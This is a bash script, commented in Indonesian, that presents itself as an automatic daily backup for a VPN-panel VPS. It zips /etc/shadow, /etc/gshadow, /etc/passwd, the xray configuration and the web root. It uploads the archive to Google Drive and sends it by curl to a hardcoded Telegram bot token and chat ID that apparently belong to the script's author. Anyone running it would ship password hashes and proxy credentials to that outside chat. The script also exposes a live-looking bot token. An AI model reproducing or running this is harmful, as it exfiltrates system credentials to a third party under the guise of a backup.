#!/bin/bash
# ==========================================
# AUTO BACKUP + TELEGRAM FILE
# BY KHOIRUL AMIR
# FIX: kirim file backup sekali ke Telegram + cek response
# ==========================================

# === CONFIG TELEGRAM ===
BOT_TOKEN="8300633089:AAG37Nd2bf_65SD_tItsJypQ2gDGejc5yKc"
CHAT_ID="5376506914"
TIME="120"
URL_DOC="https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"

# === CONFIG BACKUP ===
BACKUP_DIR="/root/backup"
LOG_FILE="/root/telegram_backup_response.log"

# === INFO VPS ===
IP=$(curl -sS ipv4.icanhazip.com 2>/dev/null)
domain=$(cat /etc/xray/domain 2>/dev/null)
date=$(date +"%Y-%m-%d")
ZIP_FILE="/root/${IP}-${date}.zip"

# Kalau domain kosong, isi tanda -
[ -z "$domain" ] && domain="-"
[ -z "$IP" ] && IP="unknown-ip"

# === PROSES BACKUP ===
echo "Proses backup sedang berlangsung..."
rm -rf "$BACKUP_DIR"
mkdir -p "$BACKUP_DIR"

cp /etc/passwd "$BACKUP_DIR/" 2>/dev/null
cp /etc/group "$BACKUP_DIR/" 2>/dev/null
cp /etc/shadow "$BACKUP_DIR/" 2>/dev/null
cp /etc/gshadow "$BACKUP_DIR/" 2>/dev/null
cp /etc/crontab "$BACKUP_DIR/" 2>/dev/null
cp -r /var/lib/kyt "$BACKUP_DIR/kyt" 2>/dev/null
cp -r /etc/xray "$BACKUP_DIR/xray" 2>/dev/null
cp -r /var/www/html "$BACKUP_DIR/html" 2>/dev/null

cd /root || exit 1
rm -f "$ZIP_FILE"
zip -r "$ZIP_FILE" backup > /dev/null 2>&1

if [ ! -f "$ZIP_FILE" ]; then
    echo "❌ File backup gagal dibuat: $ZIP_FILE"
    exit 1
fi

# === UPLOAD KE GOOGLE DRIVE ===
rclone copy "$ZIP_FILE" dr:backup/ --progress
url=$(rclone link "dr:backup/$(basename "$ZIP_FILE")")
id=$(echo "$url" | grep -o '[-_a-zA-Z0-9]\{25,\}' | head -n 1)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"

# === CAPTION TELEGRAM ===
# Jangan pakai parse_mode=HTML supaya tidak gagal karena karakter khusus.
CAPTION="◇━━━━━━━━━━━━━━◇
⚠️ BACKUP OTOMATIS ⚠️
Detail Backup VPS
◇━━━━━━━━━━━━━━◇
IP VPS  : ${IP}
DOMAIN  : ${domain}
Tanggal : ${date}
◇━━━━━━━━━━━━━━◇
Link Backup:
${link}
◇━━━━━━━━━━━━━━◇
Backup dibuat otomatis setiap hari.
BY BOT : @Kamirr21"

# === KIRIM FILE + CAPTION SEKALI KIRIM KE TELEGRAM ===
TG_RESPONSE=$(curl --http1.1 -sS --max-time "$TIME" \
    -F "chat_id=${CHAT_ID}" \
    -F "document=@${ZIP_FILE}" \
    -F "caption=${CAPTION}" \
    "$URL_DOC" 2>&1)

echo "$TG_RESPONSE" > "$LOG_FILE"

if echo "$TG_RESPONSE" | grep -q '"ok":true'; then
    echo "✅ Backup harian selesai, file dan detail backup terkirim sekali ke Telegram!"
    rm -rf "$BACKUP_DIR"
    rm -f "$ZIP_FILE"
else
    echo "❌ Gagal kirim file backup ke Telegram!"
    echo "File backup TIDAK dihapus, masih ada di: $ZIP_FILE"
    echo "Cek detail error di: $LOG_FILE"
    cat "$LOG_FILE"
    exit 1
fi
